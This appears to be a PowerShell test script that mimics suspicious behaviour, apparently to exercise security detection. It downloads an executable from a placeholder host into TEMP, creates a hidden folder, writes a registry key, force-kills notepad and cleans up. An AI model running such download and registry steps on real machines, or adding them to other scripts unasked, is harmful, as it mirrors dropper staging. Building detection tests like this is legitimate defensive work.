# Simple PowerShell script for testing
$url = "http://example.com/test.exe"
$outpath = "$env:TEMP\test.exe"

# Create suspicious-looking actions
New-Item -ItemType Directory -Force -Path "$env:TEMP\hidden_folder"
Set-Location "$env:TEMP\hidden_folder"

# Network connection attempt
try {
    Invoke-WebRequest -Uri $url -OutFile $outpath
} catch {
    Write-Host "Download failed"
}

# Registry modification attempt
New-Item -Path "HKCU:\Software\TestKey" -Force

# Process manipulation
Get-Process | Where-Object { $_.ProcessName -eq "notepad" } | Stop-Process -Force

# Cleanup
Remove-Item -Path "$env:TEMP\hidden_folder" -Force -Recurse